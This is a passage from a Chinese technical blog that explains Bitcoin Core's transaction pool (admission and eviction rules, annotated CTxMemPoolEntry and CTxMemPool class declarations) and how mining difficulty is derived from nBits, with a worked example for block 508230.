rel=\"noopener\">比特币挖矿之矿工任务</a>中我们提到，矿工会监听交易广播，并把通过验证的交易放入本地交易池。当然矿工可以通过设置最低交易费等规则来控制交易池的大小，在一个区块完成竞争后，矿工会按照一定的规则，从交易池中取出交易，在保证大部分交易都能得到打包的情况下，赚取更多的手续费。这儿交易池的作用就是在本地存放未确认的交易，作为区块打包的仓库，一笔交易被收录进交易池的流程如下：<br>1、验证交易是否有效（是否是规范交易，是否双花，签名是否有效，支付方是否有足够的余额），如果无效直接拒绝<br>2、验证是否是孤儿交易，如果是，本地保存，不转发，防DDOS攻击<br>3、按照一定排序规则加入交易池</p>\n<p>当然交易池中也存在交易清理机制，当出现如下情况时，交易会被清理出交易池：<br>1、交易池达到上限，会将交易池中排名末端的交易剔除出去<br>2、出现交易双花，满足交易替换规则（手续费更高的会被留下），低手续费交易及其子孙交易会被剔除出去<br>3、最新块中已经包含的交易会被剔除掉<br>4、与最新块中已经包含交易冲突的交易及其子孙交易会被剔除掉<br>5、交易在交易池中存在时间过长</p>\n<p>在比特币系统中，使用CTxMemPoolEntry来封装被接受的交易，使用CTxMemPool对象来表示整个交易池信息。<br><a href=\"https://github.com/bitcoin/bitcoin/blob/master/src/txmempool.h#L64\" target=\"_blank\" rel=\"noopener\">CTxMemPoolEntry</a>:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class CTxMemPoolEntry</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">    // 交易引用</span><br><span class=\"line\">    CTransactionRef tx;</span><br><span class=\"line\">    // 交易费</span><br><span class=\"line\">    CAmount nFee;</span><br><span class=\"line\">    // 交易weight</span><br><span class=\"line\">    size_t nTxWeight;</span><br><span class=\"line\">    // 大小</span><br><span class=\"line\">    size_t nUsageSize;</span><br><span class=\"line\">    // 加入交易池时间</span><br><span class=\"line\">    int64_t nTime;</span><br><span class=\"line\">    // 加入交易池时区块高度</span><br><span class=\"line\">    unsigned int entryHeight;</span><br><span class=\"line\">    // 上笔交易来源于Coinbase交易</span><br><span class=\"line\">    bool spendsCoinbase;</span><br><span class=\"line\"></span><br><span class=\"line\">    int64_t sigOpCost;</span><br><span class=\"line\">    // 此参数用来决定该笔交易的挖矿优先级</span><br><span class=\"line\">    int64_t feeDelta;</span><br><span class=\"line\">    // 该笔交易在加入区块链前区块的高度和时间</span><br><span class=\"line\">    LockPoints lockPoints;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 子孙交易信息，当剔除该交易时，所有子孙交易也必须同时剔除掉</span><br><span class=\"line\">    // 子孙交易数量</span><br><span class=\"line\">    uint64_t nCountWithDescendants;</span><br><span class=\"line\">    // 子孙交易总大小</span><br><span class=\"line\">    uint64_t nSizeWithDescendants;</span><br><span class=\"line\">    // 子孙交易交易费之和</span><br><span class=\"line\">    CAmount nModFeesWithDescendants;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 祖先交易信息，当剔除该交易时，对应的祖先交易也应更新子孙信息</span><br><span class=\"line\">    // 祖先交易数量</span><br><span class=\"line\">    uint64_t nCountWithAncestors;</span><br><span class=\"line\">    // 祖先交易大小</span><br><span class=\"line\">    uint64_t nSizeWithAncestors;</span><br><span class=\"line\">    // 祖先交易总手续费之和</span><br><span class=\"line\">    CAmount nModFeesWithAncestors;</span><br><span class=\"line\"></span><br><span class=\"line\">    int64_t nSigOpCostWithAncestors;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 成员方法</span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>我们注意到CTxMemPoolEntry对象不只包括交易本身的信息。还包括子孙交易和祖先交易信息，这些信息将在交易加入交易池排序时用到，下文将会具体介绍。</p>\n<p><a href=\"https://github.com/bitcoin/bitcoin/blob/master/src/txmempool.h#L440\" target=\"_blank\" rel=\"noopener\">CTxMemPool</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class CTxMemPool</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private:</span><br><span class=\"line\">    // 在2^32时间内检查的次数</span><br><span class=\"line\">    uint32_t nCheckFrequency;</span><br><span class=\"line\">    </span><br><span class=\"line\">    unsigned int nTransactionsUpdated;</span><br><span class=\"line\">    CBlockPolicyEstimator* minerPolicyEstimator;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 交易池中所有交易的虚拟大小，不包括隔离见证数据</span><br><span class=\"line\">    uint64_t totalTxSize;</span><br><span class=\"line\">    // mapTx中所有元素的动态内存大小之和</span><br><span class=\"line\">    uint64_t cachedInnerUsage;</span><br><span class=\"line\"></span><br><span class=\"line\">    mutable int64_t lastRollingFeeUpdate;</span><br><span class=\"line\">    mutable bool blockSinceLastRollingFeeBump;</span><br><span class=\"line\">    // 进入交易池的最小交易费</span><br><span class=\"line\">    mutable double rollingMinimumFeeRate;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    void trackPackageRemoved(const CFeeRate&amp; rate);</span><br><span class=\"line\"></span><br><span class=\"line\">public:</span><br><span class=\"line\">    </span><br><span class=\"line\">    static const int ROLLING_FEE_HALFLIFE = 60 * 60 * 12; // public only for testing</span><br><span class=\"line\"></span><br><span class=\"line\">    // 将CTxMemPoolEntry按照交易Hash，交易费率，加入交易池时间，祖先交易费率加入到多索引容器中</span><br><span class=\"line\">    // 这儿的排序直接决定了交易被打包进区块和剔除出交易池的先后顺序</span><br><span class=\"line\">    typedef boost::multi_index_container&lt;</span><br><span class=\"line\">        CTxMemPoolEntry,</span><br><span class=\"line\">        boost::multi_index::indexed_by&lt;</span><br><span class=\"line\">            // 以txid排序</span><br><span class=\"line\">            boost::multi_index::hashed_unique&lt;mempoolentry_txid, SaltedTxidHasher&gt;,</span><br><span class=\"line\">            // 以交易费率排序</span><br><span class=\"line\">            boost::multi_index::ordered_non_unique&lt;</span><br><span class=\"line\">                boost::multi_index::tag&lt;descendant_score&gt;,</span><br><span class=\"line\">                boost::multi_index::identity&lt;CTxMemPoolEntry&gt;,</span><br><span class=\"line\">                CompareTxMemPoolEntryByDescendantScore</span><br><span class=\"line\">            &gt;,</span><br><span class=\"line\">            // 以交易加入交易池时间排序</span><br><span class=\"line\">            boost::multi_index::ordered_non_unique&lt;</span><br><span class=\"line\">                boost::multi_index::tag&lt;entry_time&gt;,</span><br><span class=\"line\">                boost::multi_index::identity&lt;CTxMemPoolEntry&gt;,</span><br><span class=\"line\">                CompareTxMemPoolEntryByEntryTime</span><br><span class=\"line\">            &gt;,</span><br><span class=\"line\">            // 以祖先交易费率排序</span><br><span class=\"line\">            boost::multi_index::ordered_non_unique&lt;</span><br><span class=\"line\">                boost::multi_index::tag&lt;ancestor_score&gt;,</span><br><span class=\"line\">                boost::multi_index::identity&lt;CTxMemPoolEntry&gt;,</span><br><span class=\"line\">                CompareTxMemPoolEntryByAncestorFee</span><br><span class=\"line\">            &gt;</span><br><span class=\"line\">        &gt;</span><br><span class=\"line\">    &gt; indexed_transaction_set;</span><br><span class=\"line\"></span><br><span class=\"line\">    mutable CCriticalSection cs;</span><br><span class=\"line\">    // 满足交易池加入条件的交易都将缓存到mapTx中</span><br><span class=\"line\">    indexed_transaction_set mapTx;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 以txid为索引的迭代器</span><br><span class=\"line\">    typedef indexed_transaction_set::nth_index&lt;0&gt;::type::iterator txiter;</span><br><span class=\"line\">    // </span><br><span class=\"line\">    std::vector&lt;std::pair&lt;uint256, txiter&gt; &gt; vTxHashes;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Hash比较器</span><br><span class=\"line\">    struct CompareIteratorByHash &#123;</span><br><span class=\"line\">        bool operator()(const txiter &amp;a, const txiter &amp;b) const &#123;</span><br><span class=\"line\">            return a-&gt;GetTx().GetHash() &lt; b-&gt;GetTx().GetHash();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    typedef std::set&lt;txiter, CompareIteratorByHash&gt; setEntries;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 获取当前交易池中的父辈交易集合</span><br><span class=\"line\">    const setEntries &amp; GetMemPoolParents(txiter entry) const;</span><br><span class=\"line\">    // 获取当前交易池中的子辈交易集合</span><br><span class=\"line\">    const setEntries &amp; GetMemPoolChildren(txiter entry) const;</span><br><span class=\"line\">private:</span><br><span class=\"line\">    typedef std::map&lt;txiter, setEntries, CompareIteratorByHash&gt; cacheMap;</span><br><span class=\"line\"></span><br><span class=\"line\">    struct TxLinks &#123;</span><br><span class=\"line\">        setEntries parents;</span><br><span class=\"line\">        setEntries children;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 缓存交易与祖先交易和子孙交易的关联</span><br><span class=\"line\">    typedef std::map&lt;txiter, TxLinks, CompareIteratorByHash&gt; txlinksMap;</span><br><span class=\"line\">    txlinksMap mapLinks;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 更新父辈交易的状态</span><br><span class=\"line\">    void UpdateParent(txiter entry, txiter parent, bool add);</span><br><span class=\"line\">    // 更新子辈交易的状态</span><br><span class=\"line\">    void UpdateChild(txiter entry, txiter child, bool add);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 返回根据祖先交易数量排序的交易集合</span><br><span class=\"line\">    std::vector&lt;indexed_transaction_set::const_iterator&gt; GetSortedDepthAndScore() const;</span><br><span class=\"line\"></span><br><span class=\"line\">public:</span><br><span class=\"line\">    // 缓存交易来源与交易的关联</span><br><span class=\"line\">    indirectmap&lt;COutPoint, const CTransaction*&gt; mapNextTx;</span><br><span class=\"line\">    std::map&lt;uint256, CAmount&gt; mapDeltas;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 创建一个新交易池，只能显式创建</span><br><span class=\"line\">    explicit CTxMemPool(CBlockPolicyEstimator* estimator = nullptr);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 如果开启了sanity-checking，check函数将保证交易池的一致性（不存在双花的情况），如果关闭sanity-checking，则什么都不做</span><br><span class=\"line\">    void check(const CCoinsViewCache *pcoins) const;</span><br><span class=\"line\">    // 设置sanity-checking ncheckFrequency 默认为2^32-1</span><br><span class=\"line\">    void setSanityCheck(double dFrequency = 1.0) &#123; nCheckFrequency = static_cast&lt;uint32_t&gt;(dFrequency * 4294967295.0); &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 将一笔交易加入交易池</span><br><span class=\"line\">    bool addUnchecked(const uint256&amp; hash, const CTxMemPoolEntry &amp;entry, bool validFeeEstimate = true);</span><br><span class=\"line\">    bool addUnchecked(const uint256&amp; hash, const CTxMemPoolEntry &amp;entry, setEntries &amp;setAncestors, bool validFeeEstimate = true);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 将交易剔除出交易池</span><br><span class=\"line\">    // 剔除交易及其子孙交易</span><br><span class=\"line\">    void removeRecursive(const CTransaction &amp;tx, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);</span><br><span class=\"line\">    // 剔除来源为coinbase交易，但是没有成熟，所在区块最终成为孤儿块的情况</span><br><span class=\"line\">    void removeForReorg(const CCoinsViewCache *pcoins, unsigned int nMemPoolHeight, int flags);</span><br><span class=\"line\">    // 剔除与已记录在区块链中交易冲突的交易及子孙交易（双花，该交易加入交易池时，另外一笔交易可能尚未被加入到区块链上）</span><br><span class=\"line\">    void removeConflicts(const CTransaction &amp;tx);</span><br><span class=\"line\">    // 当节点接收到一个新块时，剔除已经打包进区块中的交易以及冲突交易</span><br><span class=\"line\">    void removeForBlock(const std::vector&lt;CTransactionRef&gt;&amp; vtx, unsigned int nBlockHeight);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 清空交易池</span><br><span class=\"line\">    void clear();</span><br><span class=\"line\">    void _clear();</span><br><span class=\"line\"></span><br><span class=\"line\">    // 比较两笔交易的祖先交易数量，当数量相等时，比较交易费率</span><br><span class=\"line\">    bool CompareDepthAndScore(const uint256&amp; hasha, const uint256&amp; hashb);</span><br><span class=\"line\">    </span><br><span class=\"line\">    void queryHashes(std::vector&lt;uint256&gt;&amp; vtxid);</span><br><span class=\"line\">    // 盘算交易的来源是否是CoinBase交易</span><br><span class=\"line\">    bool isSpent(const COutPoint&amp; outpoint);</span><br><span class=\"line\">    // 获取交易更新的次数</span><br><span class=\"line\">    unsigned int GetTransactionsUpdated() const;</span><br><span class=\"line\">    // 调整交易更新的次数</span><br><span class=\"line\">    void AddTransactionsUpdated(unsigned int n);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 判断交易中是否存在input为空的情况</span><br><span class=\"line\">    bool HasNoInputsOf(const CTransaction&amp; tx) const;</span><br><span class=\"line\">    // 调整CreateNewBlock时交易的优先级</span><br><span class=\"line\">    void PrioritiseTransaction(const uint256&amp; hash, const CAmount&amp; nFeeDelta);</span><br><span class=\"line\">    // </span><br><span class=\"line\">    void ApplyDelta(const uint256 hash, CAmount &amp;nFeeDelta) const;</span><br><span class=\"line\">    // </span><br><span class=\"line\">    void ClearPrioritisation(const uint256 hash);</span><br><span class=\"line\"></span><br><span class=\"line\">public:</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 从交易池中剔除一组交易。如果一笔交易在这个集合中，那么该笔交易在交易池中的所有子孙交易都应该在该集合中</span><br><span class=\"line\">    // 除非这笔交易是因为被包含在一个区块中而被剔除。</span><br><span class=\"line\">    // 当因为一笔交易被包含在区块中而删除时，设置updateDescendants为真，这样所有在该交易池中的子孙交易可以将他们的祖先交易状态更新</span><br><span class=\"line\">    void RemoveStaged(setEntries &amp;stage, bool updateDescendants, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 将孤块中包含的交易信息更新到交易池</span><br><span class=\"line\">    void UpdateTransactionsFromBlock(const std::vector&lt;uint256&gt; &amp;vHashesToUpdate);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 计算交易池中指定交易的所有祖先交易（包含该交易本身）</span><br><span class=\"line\">    bool CalculateMemPoolAncestors(const CTxMemPoolEntry &amp;entry, </span><br><span class=\"line\">                                   setEntries &amp;setAncestors, </span><br><span class=\"line\">                                   uint64_t limitAncestorCount, </span><br><span class=\"line\">                                   uint64_t limitAncestorSize,</span><br><span class=\"line\">                                   uint64_t limitDescendantCount, </span><br><span class=\"line\">                                   uint64_t limitDescendantSize, </span><br><span class=\"line\">                                   std::string &amp;errString, </span><br><span class=\"line\">                                   bool fSearchForParents = true</span><br><span class=\"line\">                                  ) const;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 计算交易池中指定交易的子孙交易</span><br><span class=\"line\">    void CalculateDescendants(txiter it, setEntries &amp;setDescendants);</span><br><span class=\"line\"></span><br><span class=\"line\">    CFeeRate GetMinFee(size_t sizelimit) const;</span><br><span class=\"line\"></span><br><span class=\"line\">    void TrimToSize(size_t sizelimit, std::vector&lt;COutPoint&gt;* pvNoSpendsRemaining=nullptr);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 剔除交易池中比指定时间早的交易，并将剔除的个数返回</span><br><span class=\"line\">    int Expire(int64_t time);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 当交易在交易池中，并且不满足指定链限制时，返回假</span><br><span class=\"line\">    bool TransactionWithinChainLimit(const uint256&amp; txid, size_t chainLimit) const;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 返回mapTx中交易个数，即交易池中交易个数</span><br><span class=\"line\">    unsigned long size()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        LOCK(cs);</span><br><span class=\"line\">        return mapTx.size();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 返回交易池中所有交易的虚拟大小总和，不包括见证数据</span><br><span class=\"line\">    uint64_t GetTotalTxSize() const</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        LOCK(cs);</span><br><span class=\"line\">        return totalTxSize;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 查询一笔交易是否在当前交易池中</span><br><span class=\"line\">    bool exists(uint256 hash) const</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        LOCK(cs);</span><br><span class=\"line\">        return (mapTx.count(hash) != 0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 获取指定hash值对应的交易引用</span><br><span class=\"line\">    CTransactionRef get(const uint256&amp; hash) const;</span><br><span class=\"line\">    // 获得交易池中交易信息</span><br><span class=\"line\">    TxMempoolInfo info(const uint256&amp; hash) const;</span><br><span class=\"line\">    // 获得交易池中所有交易信息</span><br><span class=\"line\">    std::vector&lt;TxMempoolInfo&gt; infoAll() const;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 获得动态内存大小</span><br><span class=\"line\">    size_t DynamicMemoryUsage() const;</span><br><span class=\"line\"></span><br><span class=\"line\">    boost::signals2::signal&lt;void (CTransactionRef)&gt; NotifyEntryAdded;</span><br><span class=\"line\">    boost::signals2::signal&lt;void (CTransactionRef, MemPoolRemovalReason)&gt; NotifyEntryRemoved;</span><br><span class=\"line\"></span><br><span class=\"line\">private:</span><br><span class=\"line\">    // 更新子孙交易状态 </span><br><span class=\"line\">    void UpdateForDescendants(txiter updateIt,cacheMap &amp;cachedDescendants,const std::set&lt;uint256&gt; &amp;setExclude);</span><br><span class=\"line\">    // 更新祖先交易状态</span><br><span class=\"line\">    void UpdateAncestorsOf(bool add, txiter hash, setEntries &amp;setAncestors);</span><br><span class=\"line\">    // 更新指定交易的祖先状态</span><br><span class=\"line\">    void UpdateEntryForAncestors(txiter it, const setEntries &amp;setAncestors);</span><br><span class=\"line\">    // 当一笔交易从交易池中剔除时，需更新其祖先和所有直接的儿子交易</span><br><span class=\"line\">    // 当updateDescendants为真时，也同时更新交易池中子孙交易的祖先交易状态</span><br><span class=\"line\">    void UpdateForRemoveFromMempool(const setEntries &amp;entriesToRemove, bool updateDescendants);</span><br><span class=\"line\">    // 更新父子交易关联</span><br><span class=\"line\">    void UpdateChildrenForRemoval(txiter entry);</span><br><span class=\"line\">    // 对于一个特定的交易，调用 removeUnchecked之前，必须为同时为要移除的交易集合调用UpdateForRemoveFromMempool。</span><br><span class=\"line\">    void removeUnchecked(txiter entry, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"比特币挖矿之全网难度","comments":0,"date":"2018-02-09T04:24:39.000Z","img":null,"_content":"\n2018年2月7日，比特币全网难度再次提升10.43%，而这对于正经历币价大跌的矿工来说，挖矿难度的提升，意味着挖矿收益进一步下降。那么在比特币系统中，挖矿难度究竟是如何调整的呢？\n\n### 目标值（target）\n上文中提到，矿工在打包区块的时候，合格的区块应该满足:\n``` bash\nSHA256(SHA256(BlockHeader))<target\n```\n在比特币系统中，target是使用区块头中的nBits字段来标识的。nBits使用压缩表示机制来存储当前目标值，其中nBits的前两位十六进制数字为幂(bits_exponent),后六位为系数(bits_coefficient)，nBits可以通过如下运算，得到target。\n``` bash\ntarget = bits_coefficient * 2^(8 * (bits_exponent-3))\n```\n以508230区块为例，此区块对应的bits为0x1761e9f8\n``` bash\ntarget = 0x61e9f8 *2^(0x08*(0x17-3))\n               = 0x61e9f8 *2^(0x08*0x14)\n               = 0x61e9f8 *2^0xA0\n```\n按十进制计算为:\n``` bash\ntarget = 6,416,888 * 2^160\n```\n转换为十六进制后为:\n``` bash\ntarget =0x00000000000000000061e9f80000000000000000000000000000000000000000\n```\n而记录到区块链上的该高度对应的区块头的hash值为0000000000000000003692a92ed937e4e0a5f247e27feeeb4df383e6d9c2bd94,满足要求。\n\n### 难度（difficulty）\n难度（difficulty）是对挖矿困难程度的度量，创世区块的difficulty为1。需要注意的是，difficulty并没有记录在区块头中，而是通过nBits计算得到的。具体实现如下：\n```\ndouble GetDifficulty(const CBlockIndex* blockindex)\n{\n    if (blockindex == NULL)\n    {\n        if (chainActive.Tip() == NULL)\n            return 1.0;\n        else\n            blockindex = chainActive.Tip();\n    }\n    \n    int nShift = (blockindex->nBits >> 24) & 0xff;\n    \n    double dDiff = (double)0x0000ffff / (double)(blockindex->nBits &0x00ffffff);\n    \n    while (nShift < 29)\n    {\n        dDiff *= 256.0;\n        nShift++;\n    }\n    \n    while (nShift > 29)\n    {\n        dDiff /= 256.0;\n        nShift--;\n    }\n\n    return dDiff;\n}\n```\n创世区块的bits值为0x1d00ffff，代入上述方法中，nShift=29,dDiff=1,可得创世区块的difficulty为1。\n根据上面目标值target的计算公式可得创世区块的target为:0x00000000ffff0000000000000000000000000000000000000000000000000000。根据难度调整机制（参见下文），我们可以知道，高度为1的区块的target也为0x00000000ffff0000000000000000000000000000000000000000000000000000，也就是说，为了构建出高度为1的合法区块，矿工需要不断对区块头做双SHA256运算，直到找到一个区块头的Hash值的前32位均为0，而SHA256运算结果在某一位上的值可以认为是随机的，也就是平均要做2^32次运算，才能找到问题的解。上述GetDifficulty方法表现的nBits与Difficulty的关系可转化为target与Difficulty:\n```\ndifficulty = difficulty_1_target/current_target\n```\n其中difficulty表示最新区块的挖矿难度，difficulty_1_target表示难度为1的区块的目标值，也可以理解为创世区块的目标值，current_target表示最新区块的目标值。\n从上述公式我们可以看出，难度与目标值成反比关系，目标值越小，难度越大，矿工平均需要运算的次数也就越大。\n同样以508230区块为例:\n```\ndifficulty = 0x00000000FFFF0000000000000000000000000000000000000000000000000000 /\n             0x00000000000000000061e9f80000000000000000000000000000000000000000\n           = 2.87 * 10^12\n           = 2.87 T\n```\n\n### 